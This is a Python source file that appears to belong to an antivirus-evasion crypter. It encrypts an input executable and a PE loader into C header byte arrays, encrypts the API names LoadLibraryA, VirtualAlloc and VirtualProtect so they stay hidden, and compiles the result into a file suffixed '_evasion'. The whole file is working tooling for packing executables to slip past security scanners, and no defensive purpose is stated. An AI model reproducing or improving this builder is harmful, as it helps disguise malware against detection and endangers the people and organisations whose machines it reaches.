import os
import sys
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), os.path.pardir)))
from NeedData import *
from NeedEncry import *
import shutil
import subprocess


def write_exe_to_head_file(in_exe_path:str,data_encrypt_hFile_path:str):
    '''
        function: encrypt the exe file and write it to the header file
        parameter specification:
            in_exe_path: str, the path of input exe file
            data_encrypt_hFile_path: str, the path of data_encrypt.h file
        return specification:
            ret: bool, the return value of write_exe_to_head_file
    '''
    try:
        with open(in_exe_path, "rb") as in_file:
            exe_data = bytearray(in_file.read())
    except FileNotFoundError:
        print(f'write_exe_to_head_file open file error')
        return 0  

    exe_size = len(exe_data)
    # print(f'type(exe_data):{type(exe_data)}')


    p_key, k_size = generate_random_key(min_key_size, max_key_size)

    p_enc_data, enc_data_size = encrypt(exe_data, exe_size, p_key, k_size)
    if p_enc_data is None:
        return False
    
    # write the encrypted exe data to the header file
    try:
        with open(data_encrypt_hFile_path, "w") as head_file:
            head_file.write("#pragma once\n#include \"head.h\"\n\n")

            # write the exe encryption key
            head_file.write(f"DWORD kSize = 0x{k_size:X};\n")
            head_file.write(f"BYTE pKey[0x{k_size:X}] = "+"{")
            head_file.write(", ".join(f"0x{byte:02X}" for byte in p_key))
            head_file.write("\n};\n")

            # 写入exe加密数据
            head_file.write(f"DWORD hSize = 0x{enc_data_size:X};\n")
            head_file.write(f"unsigned char hexData[0x{enc_data_size:X}] = "+"{")
            for i in range(enc_data_size):
                if i % 256 == 0:
                    head_file.write("\n    ")
                head_file.write(f"0x{p_enc_data[i]:02X}, ")
            head_file.write("\n};\n")
    except IOError:
        print(f'write_exe_to_head_file error')
        return False  

    return True  

# WriteEnPELoaderToHeadFile
def write_PELoader_to_head_file(PELoader_Hfile_path:str,PELoader_enc_flag:int):
    """
    function: write the PELoader to the header file
    parameter specification:
        PELoader_Hfile_path: str, the path of PELoader.h file
        PELoader_enc_flag: int, 1:encrypted, 0:not encrypted
    return specification:
        ret: bool, the return value of write_PELoader_to_head_file
    """

    SizeOfPELoader = len(pPELoader)

    p_shell = bytearray(pPELoader)

    peloader_key, peloader_k_size = generate_random_key(min_key_size, max_key_size)

    if PELoader_enc_flag == 1:
        p_shell,enc_data_size = encrypt(p_shell, SizeOfPELoader, peloader_key, peloader_k_size)
    else:
        p_shell,enc_data_size = p_shell,SizeOfPELoader
    

    if p_shell is None:
        return False  

    # write the PELoader to the header file
    try:
        with open(PELoader_Hfile_path, "w") as head_file:
            head_file.write("#pragma once\n#include \"head.h\"\n\n")

            # write the PELoader encryption key
            head_file.write(f"DWORD peloaderKSize = 0x{peloader_k_size:X};\n")
            head_file.write(f"BYTE peloaderKey[0x{peloader_k_size:X}] = "+"{")
            head_file.write(", ".join(f"0x{byte:02X}" for byte in peloader_key))
            head_file.write("};\n")

            # write the PELoader encryption data
            head_file.write(f"DWORD SizeOfPELoader = 0x{enc_data_size:X};\n")
            head_file.write(f"unsigned char pPELoader[0x{enc_data_size:X}] = "+"{")

            for i in range(enc_data_size):
                if i % 256 == 0:
                    head_file.write("\n    ")
                head_file.write(f"0x{p_shell[i]:02X}, ")

            head_file.write("\n};\n")
    except IOError:
        print(f'write_PELoader_to_head_file error')
        return False

    return True 

# WriteEnBasicFuncNameToHeadFile
def write_sensitive_string_to_head_file(basicFuncName_Hfile_Path:str):
    '''
        function: write the sensitive string to the header file
        parameter specification:
            basicFuncName_Hfile_Path: str, the path of basicFuncName_encrypt.h file
        return specification:
            ret: bool, the return value of write_sensitive_string_to_head_file
    '''
    # 
    pLoadLibraryAName = bytearray(enc_func_name[0]['name'], 'utf-8')
    pVirtualAllocName = bytearray(enc_func_name[1]['name'], 'utf-8')
    pVirtualProtectName = bytearray(enc_func_name[2]['name'], 'utf-8')

    # 生成随机密钥
    SizeOfFuncKey = 0
    pFuncKey, SizeOfFuncKey = generate_random_key(16, 32)

    # 对数据进行加密
    szLoadLibraryA = 0
    szVirtualAlloc = 0
    szVirtualProtect = 0
    pLoadLibraryAName, szLoadLibraryA = encrypt(pLoadLibraryAName, enc_func_name[0]['size'], pFuncKey, SizeOfFuncKey)
    pVirtualAllocName, szVirtualAlloc = encrypt(pVirtualAllocName, enc_func_name[1]['size'], pFuncKey, SizeOfFuncKey)
    pVirtualProtectName, szVirtualProtect = encrypt(pVirtualProtectName, enc_func_name[2]['size'], pFuncKey, SizeOfFuncKey)
    print(f'pLoadLibraryAName:{pLoadLibraryAName},szLoadLibraryA:{szLoadLibraryA}')
    print(f'pVirtualAllocName:{pVirtualAllocName},szVirtualAlloc:{szVirtualAlloc}')
    print(f'pVirtualProtectName:{pVirtualProtectName},szVirtualProtect:{szVirtualProtect}')

    # try:
    with open(basicFuncName_Hfile_Path, "w") as headFile:
        headFile.write("#pragma once\n#include \"head.h\"\n\n")

        headFile.write(f"DWORD SizeOfFuncKey = 0x{SizeOfFuncKey:X};\n")
        headFile.write(f"BYTE pFuncKey[0x{SizeOfFuncKey:X}] = "+"{")
        headFile.write(", ".join(f"0x{byte:02X}" for byte in pFuncKey))
        headFile.write("};\n\n")

        headFile.write(f"DWORD szLoadLibraryA = 0x{szLoadLibraryA:X};\n")
        headFile.write(f"BYTE strLoadLibraryA[0x{szLoadLibraryA:X}] = "+"{")
        headFile.write(", ".join(f"0x{pLoadLibraryAName[i]:02X}" for i in range(szLoadLibraryA)))
        headFile.write("};\n\n")

        headFile.write(f"DWORD szVirtualAlloc = 0x{szVirtualAlloc:X};\n")
        headFile.write(f"BYTE strVirtualAlloc[0x{szVirtualAlloc:X}] = "+"{")
        headFile.write(", ".join(f"0x{pVirtualAllocName[i]:02X}" for i in range(szVirtualAlloc)))
        headFile.write("};\n\n")

        headFile.write(f"DWORD szVirtualProtect = 0x{szVirtualProtect:X};\n")
        headFile.write(f"BYTE strVirtualProtect[0x{szVirtualProtect:X}] = "+"{")
        headFile.write(", ".join(f"0x{pVirtualProtectName[i]:02X}" for i in range(szVirtualProtect)))
        headFile.write("};\n\n")

        headFile.write("\n\n")

    return 1 


# SecondCompilate
def second_compilate(in_exe_name:str,source_code_directory_path:str, out_exe_directory_path:str):
    """
    function: compile the source code
    parameter specification:
        in_exe_name: str, the name of input exe file
        source_code_directory_path: str, the path of source code directory
        out_exe_directory_path: str, the path of output exe directory
    return specification:
        out_exe_file_path: str, the path of output exe file

    """
    release_directory_path = os.path.join(source_code_directory_path, "RELEASE")
    

    os.makedirs(release_directory_path, exist_ok=True)
    original_directory = os.getcwd()
    
    try:
        # Change the current working directory to the source code directory
        os.chdir(source_code_directory_path)

        bat_cl_file_path = os.path.join(source_code_directory_path, "building_cl.bat")
        ret_cl = subprocess.run(bat_cl_file_path, shell=True)

        if ret_cl.returncode != 0:
            print("WinExec building_cl.bat failed!")
            return None

        bat_link_file_path = os.path.join(source_code_directory_path, "building_link.bat")
        ret_link = subprocess.run(bat_link_file_path, shell=True)

        if ret_link.returncode != 0:
            print("WinExec building_link.bat failed!")
            return None
        
        out_exe_name = os.path.basename(in_exe_name)+"_evasion"
        out_exe_file_path = os.path.join(out_exe_directory_path, out_exe_name)

        source_file_path = os.path.join(source_code_directory_path, "MAIN.EXE")
        
        shutil.copyfile(source_file_path, out_exe_file_path)
        print(f"Copy {source_file_path} to {out_exe_file_path}")
        
        os.chdir(original_directory)
        return out_exe_file_path

    except Exception as e:
        print(f"Error: {e}")
        return None


